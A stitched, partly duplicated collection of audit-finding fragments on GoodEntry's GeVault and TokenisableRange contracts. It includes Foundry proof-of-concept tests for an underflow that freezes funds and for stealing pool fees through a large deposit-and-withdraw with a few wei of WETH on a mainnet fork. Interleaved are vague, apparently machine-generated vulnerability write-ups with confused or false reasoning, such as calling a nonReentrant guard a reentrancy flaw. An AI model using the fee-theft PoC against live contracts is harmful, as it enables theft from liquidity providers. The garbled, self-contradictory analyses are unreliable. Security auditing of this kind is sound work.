halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow.

In particular, the former [is called by the `claimFee()`](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L187) function, which is always called when  and  liquidity.\n\nThe root cause of this issue is that the FullMath.sol library, [imported from UniswapV3](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) was [altered to build with solidity v0.8.x](https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/lib/FullMath.sol#L2), which has under/overflow protection; the library, however, makes use of these by design, so it won't work properly when compiled in v0.8.0 or later:\n```Solidity\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\nlibrary FullMath {\n```\n\n## Impact\nWhen the fair exchange price of the pool backing the TokenisableRange's falls outside the range (higher side), the `deposit` and `withdraw` will always revert, locking the underlying assets in the pool until the price swings to a different value that does not trigger an under/overflow. If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

Specifically, the function `withdraw` allows users to redeem BPTs for an exact amount of one asset from the pool (using a mechanism like `BPT_IN_FOR_EXACT_TOKENS_OUT`). This can be exploited by an attacker who deliberately further imbalances the pool by adding or removing a large amount of one asset, causing a significant price and liquidity shift within the pool.

The attacker can then request a withdrawal of this asset representing a significant portion of the pool's value by redeeming a relatively small amount of their BPTs.

The reason for this is that there is a potential error in the calculation of `removedLiquidity`. Specifically, the line `uint removedLiquidity = uint(liquidity) * lp / totalSupply();` could cause an overflow or underflow, depending on the input values of `lp` and `totalSupply()`.\n\nTo understand why this is a vulnerability, consider that the value of `removedLiquidity` depends on the calculation `(uint(liquidity) * lp / totalSupply())`. If `lp` is small compared to `totalSupply()`, then the result of this calculation could be very large. In other words, if an attacker deposits a small amount of liquidity into the pool and transfers a large amount of attributions to the pool after depositing, they can obtain a significantly larger share of the pool than they should.\n\nThis issue is particularly relevant because the smart contract code has two critical components: (1) calculating `removedLiquidity` based on the input values of `lp` and `totalSupply()`; and (2) using this value to calculate the amount of liquidity that will be removed from the pool in the line `POS_MGR.decreaseLiquidity(...)`.\n\nThe vulnerability is particularly insidious because it can occur without any explicit error message or exception thrown by the smart contract code. Instead, the vulnerability could be exploited through a clever manipulation of the input values to the `withdraw` function. For example, an attacker could deposit a small amount of liquidity into the pool and then transfer a large amount of attributions to the pool in order to increase their share of the pool without being detected.\n\nTo mitigate this vulnerability, it is important to ensure that the smart contract code properly checks for and handles potential overflow or underflow conditions when performing arithmetic operations on integer values.

The `claimFee()` function can cause undesired outcomes such as rounding down shares to zero, and this vulnerability exploits this flaw.\n\nTo demonstrate this vulnerability, one could generate a PoC by depositing a small amount of liquidity (e.g., 1 wei) into the pool and then withdrawing some amount of liquidity from the pool while providing a large amount of attributions (e.g., 100 wei) to the pool after the first deposit.

If the oracle price stays within this range indefinitely, the funds are permanently locked.\n\n## Proof of Concept\nI'll prove that permanent freezing can happen in two steps:\n- first I'll show one condition where the underflow happens\n- then, I'll set up a fuzz test to prove that given an A and B ticker, we cannot find a market price lower than A such that the underflow does not happen \n\nThe most simple way to prove the first point is by calling `LiquidityAmounts.getAmountsForLiquidity` in isolation with real-world values:\n```solidity\n    function testGetAmountsForLiquidityRevert() public {\n        // real-world value: it's in fact the value returned by\n        // V3_FACTORY.getPool(USDC, WETH, 500).slot0();\n        // at block 17811921; it is around 1870 USDC per WETH\n        uint160 sqrtRatioX96 = 1834502451234584391374419429242405;\n\n        // start price and end corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        vm.expectRevert();\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\nHowever, a more integrated test that involves PositionManager can also be considered:\n```\n    function testPocReturnExpectedBalanceUnderflow() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n        vm.startPrank(tokenWhale);\n        TokenisableRange tr = new TokenisableRange();\n        tr.initProxy(AaveOracle, USDC, WETH, 1700e10, 1800e10, \"Test1\", \"T1\", false);\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n        vm.expectRevert();\n        tr.returnExpectedBalance(0, 0);\n    }\n```\n\nThen, we can prove the second point with a negative fuzz test:\n```Solidity\n    function testFailPermanentFreeze(uint160 sqrtRatioX96) public {\n        // start & and price, corresponding to 1700 to 1800 USDC per WETH\n        uint160 sqrtRatioAX96 = 1866972058592130739290643700340936;\n        uint160 sqrtRatioBX96 = 1921904167735311150677430952623492;\n\n        // make sure that the market ratio is lower than the lower ticker\n        // that is the range where I first observed the underflow\n        // (WETH above 1800 USDC)\n        sqrtRatioX96 = sqrtRatioX96 % (sqrtRatioAX96 - 1);\n\n        // expect a revert here\n        LiquidityAmounts.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, 1e18);\n    }\n```\n\n## Tools Used\nIDE, Foundry\n\n## Recommended Mitigation Steps\nRestore [the original FullMath.sol library](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) so it compiles with solc versions earlier than 0.8.0.\n\n```Solidity\n// SPDX-License-Identifier: GPL-3.0\n- pragma solidity ^0.8.4;\n+ pragma solidity >=0.4.0 <0.8.0;\n\n/// @title Contains 512-bit math functions\n/// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision\n/// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits\n```\n\nAnother possible option, which is however not recommended, is to enclose the non-assembly statements of FullMath.sol in an `unchecked` block.\n\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nUnder/Overflow",

The withdraw function takes in the parameter \"lp\" which represents the liquidity provider's liquidity and uses it to calculate the amount of tokens withdrawn by scaling down the total supply by a factor derived from the pool's share price. This is not accurate as the actual token amount needed may be different based on the pool's mechanism for share representation.\n2. The function then passes the calculated value to the \"decreaseLiquidity\" function of the POS_MGR contract, which decreases the liquidity by this amount. However, this is not the exact amount that should be withdrawn as it may have been diluted during the calculation.\n3. This can lead to a situation where not enough tokens are withdrawn to meet the user's needs, which can trigger a subsequent operation to fail if it relies on the assumption that the required token quantity is available post-withdrawal.\n4. If the requested amount is not met \u2013 as happens with the erroneous calculation \u2013 the function may revert, denying the user the ability to withdraw their expected amount of tokens and potentially disrupting the normal flow of interactions with the contract.\n\nThe reason for this vulnerability is that the smart contract code uses a factor derived from the pool's share price to calculate the amount of tokens withdrawn, which can lead to inaccurate calculations and potential vulnerabilities. The solution is to omit the inappropriate scaling factor and use the actual token amount needed, taking into account the pool's share allocation and redemption mechanism, without unnecessary adjustments that dilute the amount.",

The `minAmount` variable is set to 0.5%, which is a trivial fraction compared to the overall liquidity of the contract.\n\nThis means that if an attacker can manipulate the price of the underlying assets, they may be able to withdraw more assets than expected without triggering the slippage protection mechanism. This could lead to a significant loss of funds for users who rely on this contract to manage their liquidity and protect their investments.\n\nTo mitigate this vulnerability, it is recommended that the code reviewers consider implementing a proper slippage calculation mechanism that takes into account the market price fluctuations and potential manipulation by malicious actors.

The withdrawal mechanism allows users to redeem a specific amount of one asset (represented by `amount0Min` or `amount1Min`) from the pool, regardless of the balance state of the pool. This means that an attacker can exploit this imbalance by deliberately further imbalancing the pool by adding or removing a large amount of one asset, and then requesting a withdrawal of this asset representing a significant portion of the pool's value. The vulnerable withdrawal mechanism would accept any loss\u2014potentially up to 100% slippage\u2014to ensure the user receives the exact requested amount of the asset. This forces the pool to burn a disproportionate number of BPTs from all pool participants (including the attacker), including the attacker who can rebalance the pool by returning the asset they withdrew at a favorable rate due to the imbalance they created, effectively profiting at the expense of other participants who now hold devalued pool tokens.\n\nThe vulnerability type is withdrawal manipulation, as the smart contract allows users to manipulate the withdrawal process by exploiting the imbalance in the pool and burning a disproportionate number of BPTs from all pool participants, including the attacker. The reason for this answer is that the smart contract does not enforce a proportional withdrawal of assets based on the current balance state of the pool, which leads to an exploitable vulnerability for attackers to manipulate the pool's liquidity and burn disproportionate amounts of BPTs from all pool participants.",

This appears to be a standard pattern used in Uniswap-like protocols.\n\nHowever, the third part of the code contains an error that could potentially lead to the exploitation you described: if the fee for either token is zero but the other token's fee is non-zero, the `increaseLiquidity` method will be called with a minimum amount of liquidity that is 95% of the desired amount for each token. This could potentially lead to a situation where the pool's liquidity is not fully utilized, and the attacker can manipulate the outcome of future deposits into the pool.\n\nTo exploit this vulnerability, an attacker would need to deposit a small amount of liquidity into the pool (e.g., less than 0.1% of the total liquidity) while setting the fee for one token to zero and the other token's fee to a non-zero value. They could then deposit more tokens into the pool, causing their shares to be rounded down to zero due to the small initial liquidity provided.

However, it does have some potential issues that could potentially lead to security problems if they are not addressed properly:\n\n1. Reentrancy Vulnerability: The `deposit()` function uses the `nonReentrant` modifier, which can help prevent reentry attacks by keeping track of the contract's state and ensuring that no external call is made while a previous one is still being executed.

However, oracles can be unreliable, and a malicious actor could manipulate the prices to their advantage. Therefore, it is important to ensure that the Uniswap oracle is properly audited and maintained by trusted third parties.\n3. Fee Calculation Vulnerability: The code uses the `claimFee()` function to calculate fees for the liquidity providers. However, this function could potentially be vulnerable to an over- or underflow attack if the fee calculation logic is not properly validated. Therefore, it is important to ensure that the fee calculation logic is secure and properly audited.\n4. Token Transfer Vulnerability: The code uses the `safeTransfer()` function to transfer tokens from the pool to the liquidity providers.

However, the given smart contract code does not have any logic that allows users to add fees to their deposits, which is the crux of the vulnerability.\n\nThe vulnerability is caused by a lack of validation on the input parameters to the `deposit` function, specifically the `n0` and `n1` variables, which are used to determine how much liquidity should be added to the pool. If an attacker passes in invalid values for these variables, they can cause the calculation of available funds to fail, leading to incorrect token value for liquidity pool token holders.\n\nHowever, the given smart contract code has several checks and validations that prevent this vulnerability from occurring. For example, it requires that the `totalSupply` is greater than 0 before allowing any deposits to be made, which ensures that the liquidity pool is not empty. It also checks that the provided amounts for each token are non-zero and less than or equal to the maximum amount of liquidity allowed in a single deposit. These checks ensure that the deposited funds are valid and do not exceed the available liquidity pool balance.\n\nAdditionally, the smart contract code uses `safeTransfer` and `safeIncreaseAllowance` functions from the ERC20 token standard to transfer and increase allowances for each token, which helps prevent any issues related to the handling of funds.

These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool. Yay! \n        console2.log(int(WETH.balanceOf(tokenWhale)) - int(wethBalanceBefore));\n        require(poolSharesBefore ==  tr.balanceOf(tokenWhale));\n    }\n```\nIt is important to note that since the WETH oracle price at the forked block (17811921) is at 1870, above the 500-1000 range, the above PoC works only after fixing my other finding titled:\n> Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert\n\n## Tools Used\nCode review\n\n## Recommended Mitigation Steps\n- factor in also the token prices when calculating whether the accrued fees are indeed 1% of the pool\n- when minting TokenisableRange tokens, **always** downscale the minted fees by the relative value of non-distributed fees in the pool:\n```diff\n    // Stack too deep, so localising some variables for feeLiquidity calculations \n-    // If we already clawed back fees earlier, do nothing, else we need to adjust returned liquidity\n-    if ( newFee0 == 0 && newFee1 == 0 ){\n+    {\n      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));\n      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));\n      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");\n      // Calculate the equivalent liquidity amount of the non-yet compounded fees\n      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity \n      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   \n                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); \n    }\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath",

For example:\n\n1. Reentrancy Vulnerability: The `claimFee` function is vulnerable to reentrancy attacks because it calls the `safeTransfer` and `increaseAllowance` functions from the Uniswap SDK, which can cause a contract to call another contract, leading to unintended consequences.\n2. Front-Running Vulnerability: The `claimFee` function uses `block.timestamp` as the deadline for the transaction, which means that if two or more users try to claim fees at the same time, they may be able to front-run one another and manipulate the contract's state.\n3.

The `collect` function is called with the `recipient` set to `address(this)`, which means that the fees collected are sent to the contract itself, rather than being distributed to the users.\n2. The code does not handle the fee distribution correctly. It only sends a portion of the accumulated fees back to the user after compounding them through the Uniswap liquidity pool, without considering other factors such as the individual contribution to the liquidity pool. This can lead to unclaimed yield being sent to the attacker instead of the legitimate users.\n3. The code does not properly handle the `burn` function call. It simply returns all the fees accumulated within the tick range, without ensuring that they are correctly distributed among the different users with similar tick ranges. This can lead to unclaimed yield being stolen by an attacker.\n\nOverall, while this code does not explicitly address the Unclaimed Yield Theft in Liquidity Pool vulnerability, it could still be vulnerable if there are other issues present in the contract or the underlying logic that is not addressed here.
